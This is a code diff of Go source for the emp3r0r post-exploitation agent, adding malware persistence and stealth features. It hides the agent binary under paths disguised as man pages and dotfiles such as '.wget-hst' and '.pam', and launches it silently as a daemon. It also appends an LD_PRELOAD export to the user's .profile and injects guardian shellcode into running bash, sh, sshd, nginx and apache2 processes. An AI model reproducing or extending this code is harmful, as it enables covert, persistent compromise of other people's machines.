@@ -25,7 +25,30 @@ var (
 	}
 
 	// EmpLocations all possible locations
-	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", fmt.Sprintf("%s/.env", os.Getenv("HOME")), "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
+	EmpLocations = []string{
+		// root
+		"/env",
+		"/usr/bin/.env",
+		"/usr/local/bin/env",
+		"/bin/.env",
+		"/usr/share/man/man1/arch.gz",
+		"/usr/share/man/man1/ls.1.gz",
+		"/usr/share/man/man1/arch.5.gz",
+
+		// no root required
+		"/tmp/.env",
+		"/dev/shm/.env",
+		fmt.Sprintf("%s/.wget-hst",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.less-hist",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.sudo_as_admin_successful",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.env",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.pam",
+			os.Getenv("HOME")),
+	}
 
 	// call this to start emp3r0r
 	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
@@ -157,8 +180,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return AppendToFile(u.HomeDir+"/.profile", "export LD_PRELOAD="+Libemp3r0rFile)
-
+	return AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
@@ -169,7 +191,40 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
+// Inject shellcode into a running process, the shellcode will make sure emp3r0r is alive
+// TODO choose a process to inject into
 func injector() (err error) {
+	// this shellcode forks a process and executes emp3r0r agent
+	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
+	err = Copy(os.Args[0], GuardianAgentPath)
+	if err != nil {
+		return
+	}
+
+	// find some processes to inject
+	procs := PidOf("bash")
+	procs = append(procs, PidOf("sh")...)
+	procs = append(procs, PidOf("sshd")...)
+	procs = append(procs, PidOf("nginx")...)
+	procs = append(procs, PidOf("apache2")...)
+
+	// inject to all of them
+	for _, pid := range procs {
+		go func(pid int) {
+			if pid == 0 {
+				return
+			}
+			log.Printf("Injecting to %s (%d)...", ProcCmdline(pid), pid)
+			e := Injector(&GuardianShellcode, pid)
+			if e != nil {
+				err = fmt.Errorf("%v, %v", err, e)
+			}
+		}(pid)
+	}
+	if err != nil {
+		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&GuardianShellcode, 0))
+	}
+
 	return
 }
 
